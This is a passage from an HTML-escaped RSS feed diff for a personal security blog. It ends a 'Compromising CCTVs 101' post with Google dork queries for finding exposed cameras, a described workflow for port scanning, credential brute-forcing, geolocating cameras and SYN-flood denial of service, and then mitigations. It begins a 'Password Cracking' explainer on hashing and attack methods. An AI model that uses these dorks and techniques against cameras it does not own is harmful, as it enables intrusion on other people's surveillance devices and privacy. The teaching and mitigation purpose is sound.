+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Middle frame of Videoconference Management System&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;htm&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tilt&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Live View / - AXIS&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;view&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;view&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shtml&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;AXIS 240 Camera Server&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;server push&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;help&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;--- VIDEO WEB SERVER ---&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Video Web Server&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Any time &amp;amp; Any where&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HomeSeer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Web&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Control&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Home&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Status&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Events&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Log&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;camctrl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cgi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;supervisioncam protocol&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;active webcame page&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/google_dorking.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1000&#34;
+	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/google_dorking_hu7955939607532502183.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/google_dorking_hu930169016370301703.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Google Dorking&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;192&#34;
+		data-flex-basis=&#34;460px&#34;
+	
+&gt;
+&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/google_dorking_cctv.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/google_dorking_cctv_hu1090711425912968332.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/google_dorking_cctv_hu4876511850212848111.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;CCTV&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;
+We won&amp;rsquo;t cover much of the dorking part, because it is painful to extract the links from a google search queries and the other 2 mentioned methods work well for our purporse.&lt;/p&gt;
+&lt;h4 id=&#34;port-scanning&#34;&gt;Port Scanning
+&lt;/h4&gt;&lt;p&gt;Instead of using Shodan for getting Devices with a open port, we can manually scan for open ports. This is the method that should be opted for collecting IP Addresses of CCTVs on a Local/Corporate Network. We can use Port Scanning tools like &lt;a class=&#34;link&#34; href=&#34;https://nmap.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;nmap&lt;/a&gt;, &lt;a class=&#34;link&#34; href=&#34;https://www.kali.org/tools/unicornscan/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;unicornscan&lt;/a&gt;, etc. For scanning a Large Subdomain/Large Number of Devices I&amp;rsquo;d prefer using &lt;em&gt;unicornscan&lt;/em&gt; tool, because it sends all the &lt;em&gt;SYN Packets&lt;/em&gt; without waiting for responses and starts a sniffer which looks for &lt;em&gt;SYN-ACK Packets&lt;/em&gt; to determine which Device has an open port, making it faster than &lt;em&gt;nmap&lt;/em&gt;.&lt;br /&gt;
+In the following example of port scan, I&amp;rsquo;ve used &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/Port-Scanner&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Gill-Singh-A/Port-Scanner&lt;/a&gt;. In this repository &lt;em&gt;port_scanner.py&lt;/em&gt; sends the &lt;em&gt;SYN Packet&lt;/em&gt;, waits for the &lt;em&gt;SYN-ACK Packets&lt;/em&gt; and then completes the TCP Handshake by sending the &lt;em&gt;ACK&lt;/em&gt; Packet and finally closes the connection by sending &lt;em&gt;FIN Packet&lt;/em&gt; making it a slow scanner. The &lt;em&gt;scapy_port_scanner.py&lt;/em&gt; (used in the following example) is somewhat based on the &lt;em&gt;unicornscan tool&lt;/em&gt; and is faster than &lt;em&gt;port_scanner.py&lt;/em&gt;.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/port_scanner.png&#34;
+	width=&#34;1018&#34;
+	height=&#34;959&#34;
+	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/port_scanner_hu3693660484821326266.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/port_scanner_hu14907436726361292309.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Port Scanner&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;106&#34;
+		data-flex-basis=&#34;254px&#34;
+	
+&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;compiling-a-suitable-wordlist-for-brute-force&#34;&gt;Compiling a suitable Wordlist for Brute-Force
+&lt;/h3&gt;&lt;p&gt;We can make a wordlist by looking for Default Credentials for various CCTV Vendors, Weak Credentials and credentials present in &lt;a class=&#34;link&#34; href=&#34;https://github.com/danielmiessler/SecLists&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;SecLists&lt;/a&gt;.&lt;br /&gt;
+Here, I won’t disclose more information about the wordlists that I use.&lt;/p&gt;
+&lt;h2 id=&#34;brute-force&#34;&gt;Brute Force
+&lt;/h2&gt;&lt;p&gt;After Collecting the IP Address, Port and Credentials, we&amp;rsquo;re ready to do a Brute-Force attack on the Devices.&lt;br /&gt;
+I use &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/RTSP-Brute-Force&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Gill-Singh-A/RTSP-Brute-Force&lt;/a&gt;, it is a Program written in python that uses OpenCV to brute force the CCTVs and uses multithreading module to parallelize the brute force tasks. We can also redirect the Error output by OpenCv by using the error redirected to Null &lt;em&gt;2&amp;gt;/dev/null&lt;/em&gt; at the end of the command.&lt;br /&gt;
+Here in the following exampe, I&amp;rsquo;ve run the program and also opened the Stream in &lt;a class=&#34;link&#34; href=&#34;https://www.videolan.org/vlc/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;VLC Media Player&lt;/a&gt; of the CCTV that it gained access to.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/cctv_access_gained.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/cctv_access_gained_hu7225274532095461435.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/cctv_access_gained_hu12319331695325303554.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;CCTV&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br /&gt;
+We can further more Geolocate the IP Addresses using &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/IP-Location&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Gill-Singh-A/IP-Location&lt;/a&gt; to get an approximate location of the Devices (although it may not always be correct)&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/ip_location.png&#34;
+	width=&#34;1799&#34;
+	height=&#34;861&#34;
+	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/ip_location_hu6535110091859157299.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/ip_location_hu13102888798691609469.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;IP Location&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;208&#34;
+		data-flex-basis=&#34;501px&#34;
+	
+&gt;
+We can now even open the Admin Panel of the CCTV using the Browser and can manipulate crucial settings, backup storage and more.
+&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/cctv_settings.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;926&#34;
+	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/cctv_settings_hu8200271080662183132.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/cctv_settings_hu17345935752817358705.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;CCTV Settings&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;207&#34;
+		data-flex-basis=&#34;497px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;dos&#34;&gt;DOS
+&lt;/h2&gt;&lt;p&gt;We can also do a DOS (Denial-of-Service) attack on the CCTV Device to interrupt the live stream. We can use various tools to do a DOS Attack like &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/SYN-Flood-Attack&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Gill-Singh-A/SYN-Flood-Attack&lt;/a&gt;, &lt;a class=&#34;link&#34; href=&#34;https://www.kali.org/tools/goldeneye/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;GoldenEye&lt;/a&gt;, etc&lt;br /&gt;
+But I prefer using the &lt;em&gt;hping&lt;/em&gt; tool to do SYN Flood Attack because its more effective.
+&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/gif/cctv_dos.gif&#34;
+	width=&#34;1152&#34;
+	height=&#34;648&#34;
+	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/gif/cctv_dos_hu15656584701875584317.gif 480w, http://localhost:1313/p/compromising-cctvs-101/assets/gif/cctv_dos_hu3609808415653887726.gif 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;DOS Attack on CCTV&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;mitigations&#34;&gt;Mitigations
+&lt;/h2&gt;&lt;p&gt;In this blog we saw that how easy it was to gain access to a CCTV that was misconfigured (exposed to internet, using weak credentials) in several ways.&lt;br /&gt;
+To avoid getting your CCTV Device compromised, you should take the following steps:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Make sure that a CCTV Device on your Local Network is not exposed to the Internet&lt;/li&gt;
+&lt;li&gt;Not using Default/Weak Credentials&lt;/li&gt;
+&lt;li&gt;Setting up Proper Firewall Rules&lt;/li&gt;
+&lt;li&gt;Keeping the Software/Firmware up to date, to avoid any CVEs present in the device that could be exploited&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;note&#34;&gt;Note
+&lt;/h3&gt;&lt;p&gt;The Above mentioned points doesn&amp;rsquo;t Guarantee 100% protection, they only enhance the security&lt;/p&gt;
+&lt;h2 id=&#34;checking-leaked-passwords&#34;&gt;Checking Leaked Passwords
+&lt;/h2&gt;&lt;p&gt;There are several websites you can use to check whether the password that you&amp;rsquo;re using has been leaked somewhere online or not. Here are some popular ones:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://haveibeenpwned.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Have I Been Pwned&lt;/a&gt;: Check if your email or phone is in a data breach&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.dehashed.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Dehashed&lt;/a&gt;: Free deep-web scans and protection against credential leaks&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://leakcheck.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;LeakCheck.io&lt;/a&gt;: Make sure your credentials haven&amp;rsquo;t been compromised&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://crackstation.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;crackstation.net&lt;/a&gt;: Massive pre-computed lookup tables to crack password hashes&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://hashkiller.io/listmanager&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;HashKiller&lt;/a&gt;: Pre-cracked Hashes, easily searchable&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://leakedpassword.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;LeakedPassword&lt;/a&gt;: Search across multiple data breaches to see if your pass has been compromised&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://bugmenot.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;BugMeNot&lt;/a&gt;: Find and share logins&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- --&gt;
+&lt;p&gt;Source: &lt;a class=&#34;link&#34; href=&#34;https://github.com/edoardottt/awesome-hacker-search-engines&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;edoardottt/awesome-hacker-search-engines&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Password Cracking</title>
+        <link>http://localhost:1313/p/password-cracking/</link>
+        <pubDate>Mon, 23 Sep 2024 04:56:45 +0530</pubDate>
+        
+        <guid>http://localhost:1313/p/password-cracking/</guid>
+        <description>&lt;img src="http://localhost:1313/p/password-cracking/assets/images/password_cracking.jpeg" alt="Featured image of post Password Cracking" /&gt;&lt;h2 id=&#34;how-passwords-are-stored-on-servers&#34;&gt;How passwords are stored on servers?
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/password-cracking/assets/images/database.png&#34;
+	width=&#34;1720&#34;
+	height=&#34;900&#34;
+	srcset=&#34;http://localhost:1313/p/password-cracking/assets/images/database_hu1473404851421758759.png 480w, http://localhost:1313/p/password-cracking/assets/images/database_hu5701567306370613051.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Database&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;191&#34;
+		data-flex-basis=&#34;458px&#34;
+	
+&gt;&lt;br /&gt;
+Passwords are stored on databases by hashing them alone or after appending them with random values. Hashing is a one-way function that converts a given string of characters into another value. A strong hashing algorithm has to be quick, deterministic, and irreversible. In this blog, we explore how a hashed password can be cracked.&lt;/p&gt;
+&lt;h2 id=&#34;hashing-algorithms&#34;&gt;Hashing Algorithms
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/password-cracking/assets/images/hashing.png&#34;
+	width=&#34;2079&#34;
+	height=&#34;800&#34;
+	srcset=&#34;http://localhost:1313/p/password-cracking/assets/images/hashing_hu4833789966977637885.png 480w, http://localhost:1313/p/password-cracking/assets/images/hashing_hu4912368868399801949.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Hashing&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;259&#34;
+		data-flex-basis=&#34;623px&#34;
+	
+&gt;&lt;br /&gt;
+Hashing algorithms are mathematical functions that take an input (often a string of characters, such as a password) and produce a fixed-size string of characters, known as a hash value or hash code. These algorithms are designed to be one-way functions, meaning that while it&amp;rsquo;s easy to compute the hash value from the input (password), it&amp;rsquo;s computationally infeasible to reverse the process and obtain the original input from the hash value.&lt;br /&gt;
+Some common hashing Algorithms are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;md5&lt;/strong&gt;: A widely-used cryptographic hash function producing a 128-bit (16-byte) hash value&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;sha1&lt;/strong&gt;: A cryptographic hash function designed by the NSA, producing a 160-bit (20-byte) hash value.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;sha224&lt;/strong&gt;: A variant of SHA-2 family generating a 224-bit (28-byte) hash value.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;sha256&lt;/strong&gt;: Part of the SHA-2 family, producing a 256-bit (32-byte) hash value.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;sha384&lt;/strong&gt;: A SHA-2 algorithm variant producing a 384-bit (48-byte) hash value.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;sha3_224&lt;/strong&gt;: One of the SHA-3 family hash functions generating a 224-bit (28-byte) hash value.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;sha3_256&lt;/strong&gt;: Part of the SHA-3 family producing a 256-bit (32-byte) hash value.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;sha3_384&lt;/strong&gt;: A SHA-3 algorithm variant generating a 384-bit (48-byte) hash value.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;sha3_512&lt;/strong&gt;: A SHA-3 family hash function producing a 512-bit (64-byte) hash value.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;sha512&lt;/strong&gt;: A SHA-2 algorithm variant generating a 512-bit (64-byte) hash value.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;BLAKE2&lt;/strong&gt;: A cryptographic hash function offering high speed and security, available in different output sizes&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Whirlpool&lt;/strong&gt;: A cryptographic hash function producing a 512-bit (64-byte) hash value, designed by Vincent Rijmen and Paulo S. L. M. Barreto&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;RIPEMD-160&lt;/strong&gt;: A cryptographic hash function developed as an improvement of RIPEMD, producing a 160-bit (20-byte) hash value&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Tiger&lt;/strong&gt;: A cryptographic hash function known for its speed and cryptographic strength, producing a 192-bit (24-byte) hash value&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;why-passwords-are-hashed&#34;&gt;Why Passwords are Hashed
+&lt;/h2&gt;&lt;p&gt;Passwords are hashed primarily for security reasons. When a user creates an account or sets a password, the system does not store it. Instead, it computes the password&amp;rsquo;s hash value using a hashing algorithm and stores the hash value in its database.&lt;br /&gt;
+Here are the main reasons why passwords are hashed:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Protection Against Data Breaches: Hidden passwords thwart attackers&lt;/li&gt;
+&lt;li&gt;User Privacy: Shield passwords from unauthorized access&lt;/li&gt;
+&lt;li&gt;Preventing Password Reuse: Encourage unique passwords&lt;/li&gt;
+&lt;li&gt;Compliance with Security Standards: PCI DSS, GDPR, and other standards mandate password hashing for user data protection&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;salting-in-hashes&#34;&gt;Salting in Hashes
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/password-cracking/assets/images/salting.jpg&#34;
+	width=&#34;1940&#34;
+	height=&#34;1282&#34;
+	srcset=&#34;http://localhost:1313/p/password-cracking/assets/images/salting_hu13723605654203217095.jpg 480w, http://localhost:1313/p/password-cracking/assets/images/salting_hu2456114825957901133.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Salting&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;151&#34;
+		data-flex-basis=&#34;363px&#34;
+	
+&gt;&lt;br /&gt;
+Salting in hashes is a technique used to enhance the security of hashed passwords or data by adding a random or unique value, called a &lt;em&gt;salt&lt;/em&gt;, before hashing. This salt is typically a random string of characters or bits generated separately for each password or piece of data being hashed. Here&amp;rsquo;s an explanation of how salting works and why it&amp;rsquo;s important:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Adding Randomness: Salting introduces randomness by appending a unique value to each password before hashing&lt;/li&gt;
+&lt;li&gt;Preventing Precomputed Attacks: Salting thwarts precomputed attacks like rainbow tables(explained later) by ensuring each password has a distinct hash&lt;/li&gt;
+&lt;li&gt;Enhancing Security: Salting significantly boosts security by mitigating various types of attacks, including brute force and dictionary attacks&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;password-protected-files-and-drives&#34;&gt;Password Protected Files and Drives
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/password-cracking/assets/images/file_encryptions.jpg&#34;
+	width=&#34;550&#34;
+	height=&#34;345&#34;
+	srcset=&#34;http://localhost:1313/p/password-cracking/assets/images/file_encryptions_hu4445162751528759475.jpg 480w, http://localhost:1313/p/password-cracking/assets/images/file_encryptions_hu11562899296713017864.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;File Encryption&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;159&#34;
+		data-flex-basis=&#34;382px&#34;
+	
+&gt;&lt;br /&gt;
+Password-protected files, such as ZIP archives and PDF documents, are digital files encrypted with a password to prevent unauthorized access. ZIP files, compressed archives containing multiple files and folders, can be password-protected to encrypt their contents, requiring the correct password for extraction. Similarly, PDF files, commonly used for document sharing, can be secured with password protection to encrypt the document&amp;rsquo;s contents and restrict access or actions like printing and editing without the correct password. Encrypted files and drives use encryption algorithms to encode data, making it unreadable without the corresponding decryption key or password. This encryption ensures the confidentiality and security of sensitive information stored within the files or drives, reinforcing protection against unauthorized access and data breaches.&lt;/p&gt;
+&lt;h2 id=&#34;hash-cracking&#34;&gt;Hash Cracking
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/password-cracking/assets/images/methods.jpg&#34;
+	width=&#34;495&#34;
+	height=&#34;316&#34;
+	srcset=&#34;http://localhost:1313/p/password-cracking/assets/images/methods_hu8197215681215346304.jpg 480w, http://localhost:1313/p/password-cracking/assets/images/methods_hu3860945043454114380.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Hash Cracking&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;156&#34;
+		data-flex-basis=&#34;375px&#34;
+	
+&gt;&lt;br /&gt;
+In this section we explore the ways we can decipher a hashed password.&lt;/p&gt;
+&lt;h2 id=&#34;methods-of-password-cracking&#34;&gt;Methods of Password Cracking
+&lt;/h2&gt;&lt;p&gt;There are 4 methods to crack a Hash Protected Password&lt;/p&gt;
+&lt;h3 id=&#34;brute-force&#34;&gt;Brute Force
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;In a brute force attack, the attacker systematically tries every possible combination of characters until the correct password is found&lt;/li&gt;
+&lt;li&gt;This method starts with trying the simplest passwords, such as single characters or common words, and gradually progresses to more complex combinations&lt;/li&gt;
+&lt;li&gt;Brute force attacks can be resource-intensive and time-consuming, especially for longer and more complex passwords, but they are generally effective against weak passwords&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;dictionary-attack&#34;&gt;Dictionary Attack
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;A dictionary attack involves using a predefined list of words, phrases, or commonly used passwords to guess the password&lt;/li&gt;
+&lt;li&gt;Unlike brute force, which tries every possible combination, a dictionary attack focuses on likely passwords first, potentially speeding up the process&lt;/li&gt;
+&lt;li&gt;The dictionary used in this attack may include common words, phrases, names, and variations thereof, making it more efficient than brute force for many scenarios&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;rainbow-table-attack&#34;&gt;Rainbow Table Attack
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Rainbow table attacks exploit weaknesses in password storage mechanisms, particularly when passwords are hashed without salting&lt;/li&gt;
+&lt;li&gt;A rainbow table is a precomputed table of password hashes and their corresponding plaintext passwords&lt;/li&gt;
+&lt;li&gt;Instead of recalculating hashes for each attempted password, the attacker compares the hash of the target password with entries in the rainbow table to find a match&lt;/li&gt;
+&lt;li&gt;This method can be faster than brute force or dictionary attacks, especially for large datasets, but it requires significant computational resources to generate and store the rainbow table initially&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;collision-attack&#34;&gt;Collision Attack
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;A collision attack is a type of cryptographic attack where an attacker tries to find two different inputs (messages) that produce the same hash value when processed by a hashing algorithm. In other words, the attacker seeks to find a collision—a situation where two distinct inputs generate identical hash outputs.&lt;/li&gt;
+&lt;li&gt;Collision attacks can have serious security implications, especially in cryptographic systems where hash functions are used for ensuring data integrity, authentication, and other security purposes. A successful collision attack undermines the fundamental security properties of the hash function, leading to potential vulnerabilities and compromises in the overall security of the system.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;collision-attack-proof-of-concept&#34;&gt;Collision Attack Proof of Concept
+&lt;/h3&gt;&lt;p&gt;Collision attacks against MD5 are not only theoretically possible but have also been demonstrated in practice. In fact, MD5 is considered highly vulnerable to collision attacks due to its design flaws and weaknesses. &lt;br /&gt;
+In 2004, researchers Xiaoyun Wang and Hongbo Yu published a paper titled &lt;em&gt;Collisions for Hash Functions MD4, MD5, HAVAL-128 and RIPEMD&lt;/em&gt; where they presented practical collision attacks against several cryptographic hash functions, including MD5. They demonstrated that it was possible to find two different inputs that produce the same MD5 hash value, effectively breaking the collision resistance property of MD5. &lt;br /&gt;
